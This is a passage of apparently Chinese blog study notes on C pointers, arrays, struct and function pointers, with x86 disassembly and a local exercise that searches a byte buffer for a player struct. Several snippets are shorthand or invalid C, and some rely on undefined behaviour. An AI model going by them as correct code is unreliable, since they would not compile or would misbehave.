class=\"built_in\">FindRoleNameAddr</span>(data, arr2));</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230126151524978.png\" alt=\"image-20230126151524978\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//指针数组</span><br><span class=\"line\">int*** arr[5];</span><br><span class=\"line\"></span><br><span class=\"line\">char a1 = &#x27;A&#x27;;</span><br><span class=\"line\">char* p1 = &amp;a1;</span><br><span class=\"line\"></span><br><span class=\"line\">char* arr = &quot;china&quot;;</span><br><span class=\"line\">printf(&quot;%s\\n&quot;,arr);  //china</span><br><span class=\"line\"></span><br><span class=\"line\">char arr[10] = &#123;&#x27;c&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;n&#x27;,&#x27;a&#x27;&#125;;</span><br><span class=\"line\">printf(&quot;%s\\n&quot;,arr);   //china</span><br><span class=\"line\">0040D7B8 C6 45 F4 63          mov         byte ptr [ebp-0Ch],63h</span><br><span class=\"line\">0040D7BC C6 45 F5 68          mov         byte ptr [ebp-0Bh],68h</span><br><span class=\"line\">0040D7C0 C6 45 F6 69          mov         byte ptr [ebp-0Ah],69h</span><br><span class=\"line\">0040D7C4 C6 45 F7 6E          mov         byte ptr [ebp-9],6Eh</span><br><span class=\"line\">0040D7C8 C6 45 F8 61          mov         byte ptr [ebp-8],61h</span><br><span class=\"line\">0040D7CC 33 C0                xor         eax,eax</span><br><span class=\"line\">0040D7CE 89 45 F9             mov         dword ptr [ebp-7],eax</span><br><span class=\"line\">0040D7D1 88 45 FD             mov         byte ptr [ebp-3],al</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">char arr[5] = &#123;&#x27;c&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;n&#x27;,&#x27;a&#x27;&#125;;</span><br><span class=\"line\">printf(&quot;%s\\n&quot;,arr);   //china烫虉</span><br><span class=\"line\"></span><br><span class=\"line\">char arr[5] = &#123;&#x27;c&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;n&#x27;,&#x27;a&#x27;&#125;;</span><br><span class=\"line\">printf(&quot;%c\\n&quot;,arr);   //@</span><br><span class=\"line\"></span><br><span class=\"line\">char arr[6] = &#123;&#x27;c&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;n&#x27;,&#x27;a&#x27;,&#x27;\\0&#x27;&#125;;</span><br><span class=\"line\">printf(&quot;%s\\n&quot;,arr);   //china</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">char* arr[] = &#123;&quot;if&quot;,&quot;or&quot;,&quot;while&quot;,&quot;for&quot;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">char* p1 = &quot;if&quot;</span><br><span class=\"line\">char* p2 = &quot;for&quot;;</span><br><span class=\"line\">char* p3 = &quot;while&quot;;</span><br><span class=\"line\">char* p4 = &quot;switch&quot;;</span><br><span class=\"line\">char* keyword[] = &#123;p1,p2,p3,p4&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">for(int i=0;i&lt;4;i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    printf(&quot;%s\\n&quot;,*(arr+i));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230224153206988.png\" alt=\"image-20230224153206988\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//结构体指针</span><br><span class=\"line\">struct Stu</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tint b;</span><br><span class=\"line\">\tint c;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Stu* stu;</span><br><span class=\"line\">stu = (Stu*)100;</span><br><span class=\"line\">stu++;  //+12</span><br><span class=\"line\"></span><br><span class=\"line\">Stu* Stu1 = (Stu*)20;</span><br><span class=\"line\">int x = stu - stu1;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Stu s;</span><br><span class=\"line\">s.a = 10;</span><br><span class=\"line\">s.b = 20;</span><br><span class=\"line\">s.c = 30;</span><br><span class=\"line\">Stu *ss = &amp;s;</span><br><span class=\"line\">ss-&gt;a = 100;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int x = 10;</span><br><span class=\"line\">Stu* s = (Stu*)&amp;x;</span><br><span class=\"line\">printf(&quot;%d %d %d&quot;,s-&gt;a,s-&gt;b,s-&gt;c);   //10,x,x  x取决于内存中有什么</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int x1 = 1;</span><br><span class=\"line\">int x2 = 2;</span><br><span class=\"line\">int x3 = 3;</span><br><span class=\"line\"></span><br><span class=\"line\">int* arr[3];</span><br><span class=\"line\">arr[0] = &amp;x1;</span><br><span class=\"line\">arr[1] = &amp;x2;</span><br><span class=\"line\">arr[2] = &amp;x3;</span><br><span class=\"line\"></span><br><span class=\"line\">char* p1 = &quot;if&quot;</span><br><span class=\"line\">char* p2 = &quot;for&quot;;</span><br><span class=\"line\">char* p3 = &quot;while&quot;;</span><br><span class=\"line\">char* p4 = &quot;switch&quot;;</span><br><span class=\"line\">char* keyword[] = &#123;p1,p2,p3,p4&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">for(int i=0;i&lt;4;i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    printf(&quot;%s\\n&quot;,*(arr+i));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230127133346425.png\" alt=\"image-20230127133346425\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">TagPlayer</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> id;</span><br><span class=\"line\">\t<span class=\"type\">int</span> level;</span><br><span class=\"line\">&#125;Player;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> data[] = &#123;</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x01</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x03</span>,<span class=\"number\">0x04</span>,<span class=\"number\">0x05</span>,<span class=\"number\">0x06</span>,<span class=\"number\">0x07</span>,<span class=\"number\">0x07</span>,<span class=\"number\">0x09</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x20</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x03</span>,<span class=\"number\">0x03</span>,<span class=\"number\">0x0C</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x44</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x33</span>,<span class=\"number\">0x01</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x08</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0A</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x74</span>,<span class=\"number\">0x0F</span>,<span class=\"number\">0x41</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x01</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x08</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0A</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x57</span>,<span class=\"number\">0x4F</span>,<span class=\"number\">0x57</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x06</span>,<span class=\"number\">0x08</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0F</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0D</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x23</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fun</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* haha = data;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;<span class=\"keyword\">sizeof</span>(data)/<span class=\"keyword\">sizeof</span>(data[<span class=\"number\">0</span>])-<span class=\"keyword\">sizeof</span>(Player); i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tPlayer* hehe = (Player*)(haha+i);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(hehe-&gt;id == <span class=\"number\">0x01</span> &amp;&amp; hehe-&gt;level == <span class=\"number\">0x08</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\ %d \\n&quot;</span>,&amp;(hehe-&gt;id),hehe-&gt;id);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfun();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*(p1+x)  = p1[x]</span><br><span class=\"line\">两种写法一样</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span>** p2;</span><br><span class=\"line\">*(*(p2+<span class=\"number\">1</span>)) +<span class=\"number\">4</span></span><br><span class=\"line\">*(*(p2+<span class=\"number\">1</span>)+<span class=\"number\">1</span>) +<span class=\"number\">4</span>+<span class=\"number\">1</span></span><br><span class=\"line\">*(*(p2+<span class=\"number\">2</span>)+<span class=\"number\">3</span>) == p2[<span class=\"number\">2</span>][<span class=\"number\">3</span>]  +<span class=\"number\">8</span>+<span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span>*** p3;</span><br><span class=\"line\">*(*(*(p3+<span class=\"number\">1</span>)+<span class=\"number\">2</span>)+<span class=\"number\">3</span>) == p3[<span class=\"number\">1</span>][<span class=\"number\">2</span>][<span class=\"number\">3</span>]  +<span class=\"number\">4</span>+<span class=\"number\">8</span>+<span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//结构体指针</span></span><br><span class=\"line\">Student* s;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//数组指针</span></span><br><span class=\"line\"><span class=\"built_in\">int</span> (*px)[<span class=\"number\">5</span>];  </span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,<span class=\"built_in\">sizeof</span>(px));  <span class=\"comment\">//4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//赋值</span></span><br><span class=\"line\">px = ((*px)[<span class=\"number\">5</span>])<span class=\"number\">10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//*px 指向 int[5]</span></span><br><span class=\"line\">px++;  +<span class=\"number\">20</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> arr[<span class=\"number\">16</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>&#125;;</span><br><span class=\"line\"><span class=\"built_in\">int</span> (*px)[<span class=\"number\">2</span>];</span><br><span class=\"line\">px = (<span class=\"built_in\">int</span> (*px)[<span class=\"number\">2</span>])arr;  </span><br><span class=\"line\">*px == &amp;arr[<span class=\"number\">0</span>]</span><br><span class=\"line\">*(*px) == arr[<span class=\"number\">0</span>]</span><br><span class=\"line\">*(*(px)) = <span class=\"number\">1</span></span><br><span class=\"line\">*(*(px+<span class=\"number\">1</span>)+<span class=\"number\">1</span>) == <span class=\"number\">4</span>  +<span class=\"number\">8b</span>yte+<span class=\"number\">4b</span>yte   <span class=\"number\">1</span>+<span class=\"number\">3</span> </span><br><span class=\"line\">*(*(px+<span class=\"number\">3</span>)+<span class=\"number\">3</span>) == <span class=\"number\">4</span>  +<span class=\"number\">3</span>*<span class=\"number\">8b</span>yte+<span class=\"number\">3</span>*<span class=\"number\">4b</span>yte   <span class=\"number\">3</span>*<span class=\"number\">2</span>+<span class=\"number\">3</span> </span><br><span class=\"line\"><span class=\"comment\">//px 和 *px 里面的值一样</span></span><br><span class=\"line\"><span class=\"comment\">//但运算时宽度不一样  </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//指针数组</span></span><br><span class=\"line\"><span class=\"type\">int</span>* p[<span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"comment\">//这个数组的所有元素都是指针类型</span></span><br><span class=\"line\"><span class=\"comment\">//数组指针</span></span><br><span class=\"line\"><span class=\"built_in\">int</span> (*p)[<span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"comment\">//这个指针存放着一个数组的首地址，或者说这个指针指向一个数组的首地址。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//int (*p)[5] 可以不指向一个数组</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">int</span> (*px)[<span class=\"number\">5</span>];</span><br><span class=\"line\">*(*(px+<span class=\"number\">2</span>)+<span class=\"number\">2</span>)  <span class=\"number\">2</span>*<span class=\"number\">4</span>*<span class=\"number\">5</span>+<span class=\"number\">2</span>*<span class=\"number\">4</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">//二维数组指针</span></span><br><span class=\"line\"><span class=\"built_in\">char</span> (*px)[<span class=\"number\">2</span>][<span class=\"number\">3</span>];</span><br><span class=\"line\">*(*(*(px+<span class=\"number\">2</span>)+<span class=\"number\">3</span>)+<span class=\"number\">4</span>)  <span class=\"number\">2</span>*<span class=\"number\">3</span>*<span class=\"number\">2</span>+<span class=\"number\">3</span>*<span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">char</span> (*px)[<span class=\"number\">2</span>][<span class=\"number\">3</span>][<span class=\"number\">2</span>];</span><br><span class=\"line\">px = (<span class=\"built_in\">char</span> (*px)[<span class=\"number\">2</span>][<span class=\"number\">3</span>][<span class=\"number\">2</span>])code;</span><br><span class=\"line\">*(*(*(*(px+<span class=\"number\">2</span>)+<span class=\"number\">3</span>)+<span class=\"number\">1</span>)+<span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"number\">2</span>*<span class=\"number\">2</span>*<span class=\"number\">3</span>*<span class=\"number\">2</span>*<span class=\"number\">1</span> + <span class=\"number\">3</span>*<span class=\"number\">3</span>*<span class=\"number\">2</span>*<span class=\"number\">1</span> + <span class=\"number\">1</span>*<span class=\"number\">2</span>*<span class=\"number\">1</span> + <span class=\"number\">4</span>*<span class=\"number\">1</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"built_in\">int</span> (*pFun)(<span class=\"type\">int</span>,<span class=\"type\">int</span>)    <span class=\"comment\">//sizeof() = 4   是返回值为int，有两个int参数</span></span><br><span class=\"line\">pFun++   <span class=\"comment\">//illegal 因为宽度不确定</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Function</span><span class=\"params\">(<span class=\"type\">int</span> a,<span class=\"type\">int</span> b)</span>  </span>&#123; &#125;</span><br><span class=\"line\">pFun = Function;</span><br><span class=\"line\"><span class=\"type\">int</span> sb = <span class=\"built_in\">pFun</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>);</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230225163935045.png\" alt=\"image-20230225163935045\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230225172241524.png\" alt=\"image-20230225172241524\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint arr[] = &#123;1,2,3,4,5,6,7&#125;;</span><br><span class=\"line\">\tint (*px)[5];</span><br><span class=\"line\">\tpx = (int (*)[5])arr;</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%X %X\\n&quot;,*(px+1)[2],px[1][2]);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">0040D768 C7 45 E4 01 00 00 00 mov         dword ptr [ebp-1Ch],1</span><br><span class=\"line\">0040D76F C7 45 E8 02 00 00 00 mov         dword ptr [ebp-18h],2</span><br><span class=\"line\">0040D776 C7 45 EC 03 00 00 00 mov         dword ptr [ebp-14h],3</span><br><span class=\"line\">0040D77D C7 45 F0 04 00 00 00 mov         dword ptr [ebp-10h],4</span><br><span class=\"line\">0040D784 C7 45 F4 05 00 00 00 mov         dword ptr [ebp-0Ch],5</span><br><span class=\"line\">0040D78B C7 45 F8 06 00 00 00 mov         dword ptr [ebp-8],6</span><br><span class=\"line\">0040D792 C7 45 FC 07 00 00 00 mov         dword ptr [ebp-4],7</span><br><span class=\"line\">0040D799 8D 45 E4             lea         eax,[ebp-1Ch]   &amp;arr[0]</span><br><span class=\"line\">0040D79C 89 45 E0             mov         dword ptr [ebp-20h],eax  </span><br><span class=\"line\">0040D79F 8B 4D E0             mov         ecx,dword ptr [ebp-20h]</span><br><span class=\"line\">0040D7A2 8B 51 1C             mov         edx,dword ptr [ecx+1Ch]</span><br><span class=\"line\">0040D7A5 52                   push        edx</span><br><span class=\"line\">0040D7A6 8B 45 E0             mov         eax,dword ptr [ebp-20h]</span><br><span class=\"line\">0040D7A9 8B 48 3C             mov         ecx,dword ptr [eax+3Ch]</span><br><span class=\"line\">0040D7AC 51                   push        ecx</span><br><span class=\"line\">0040D7AD 68 1C 20 42 00       push        offset string &quot;%d %d %d\\n&quot; (0042201c)</span><br><span class=\"line\">0040D7B2 E8 09 39 FF FF       call        printf (004010c0)</span><br><span class=\"line\">0040D7B7 83 C4 0C             add         esp,0Ch</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint arr[] = &#123;1,2,3,4,5,6,7&#125;;</span><br><span class=\"line\">\tint (*px)[5];</span><br><span class=\"line\">\tpx = (int (*)[5])arr;</span><br><span class=\"line\">\tfor(int i=0; i&lt;sizeof(arr)/sizeof(arr[0]); i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprintf(&quot;%d\\n&quot;,*(*(px)+i));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"../AppData/Roaming/Typora/typora-user-images/image-20230130142624937.png\" alt=\"image-20230130142624937\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int (*px)[2];</span><br><span class=\"line\">int (*py)[2][3];</span><br><span class=\"line\">char (*pz)[2];</span><br><span class=\"line\">char (*pk)[2][3];</span><br><span class=\"line\"></span><br><span class=\"line\">*(*(px+0)+0)   03020100</span><br><span class=\"line\">*(*(px+1)+0)    20000907</span><br><span class=\"line\">*(*(px+2)+3)   1100</span><br><span class=\"line\">*(*(*(py+1)+2)+3)   01</span><br><span class=\"line\">*(*(pz+2)+3)  07</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int *(pFunc)(int,int)</span><br><span class=\"line\">sizeof = 4</span><br><span class=\"line\"></span><br><span 